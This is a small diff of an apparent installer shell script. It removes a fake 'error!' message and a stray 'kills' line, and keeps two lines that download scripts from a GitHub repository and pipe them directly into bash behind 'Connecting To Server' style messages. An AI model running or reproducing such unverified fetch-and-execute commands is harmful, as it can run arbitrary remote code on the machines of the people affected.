@@ -3,9 +3,6 @@ sleep 2.0
 echo "Checking Installer Update...."
 curl -sL https://github.com/testingLiveManualy/Testlivinggas/raw/main/Updtinst | bash
 echo "Connecting To Server.."
-echo "error!"
-sleep 2.0
-kills
 curl -sL https://raw.githubusercontent.com/testingLiveManualy/Testlivinggas/main/installerConnect | bash
 exit
 quit
